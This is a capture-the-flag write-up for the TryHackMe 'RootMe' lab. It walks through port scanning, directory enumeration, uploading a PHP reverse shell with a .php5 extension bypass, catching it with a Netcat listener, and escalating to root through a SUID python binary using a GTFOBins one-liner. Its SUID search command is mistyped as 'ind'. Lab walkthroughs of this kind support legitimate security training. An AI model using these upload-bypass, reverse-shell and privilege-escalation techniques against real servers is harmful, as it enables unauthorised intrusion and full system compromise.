![Banner](<images/rootme banner.png>)

RootMe Writeup - TryHackMe

---

1. **Reconnaissance**

I started with an Nmap scan to identify open ports and services:
```nmap -sV <IP-TARGET>```

- **Findings:** Port `22` (SSH) and Port `80` (HTTP) were open. The server is running Apache `2.4.29`.

---

2. **Directory Enumeration**

Using Gobuster with a common wordlist, I searched for hidden directories:
```gobuster dir -u http://<IP-TARGET> -w common.txt```

- **Findings:** Discovered /panel/ (upload interface) and /uploads/ (directory where uploaded files are stored).

---

3. **Exploitation (Gaining Access)**

I attempted to upload a PHP reverse shell. The server had a basic extension filter, blocking .php files. I bypassed this by renaming the script to .php5.

1. Prepared the shell: Edited the PentestMonkey PHP script with my VPN IP and port ```4444```.

2. Uploaded: ```shell.php5``` via the ```/panel/``` page.

3. Listener: Started a Netcat listener on my machine: nc -lvnp 4444.

4. Execution: Navigated to ```http://<IP-TARGET>/uploads/shell.php5```, triggering the connection.

**User Flag:** Found at /var/www/user.txt.

---

4.**Privilege Escalation**

Once inside as www-data, I searched for binaries with the SUID bit set:
```ind / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null```

**Vulnerability:** I identified that ```/usr/bin/python2.7``` had SUID permissions, which is a significant misconfiguration.

**Exploit:** Using a technique from GTFOBins, I spawned a root shell:
```/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'```

**Root Flag:** Found at ```/root/root.txt.```

---

**Learnings:**

This lab demonstrated how critical exposed administrative panels and insecure file permissions can be. It highlights that a proper web server configuration and the enforcement of the Principle of Least Privilege are essential to prevent full system compromise.
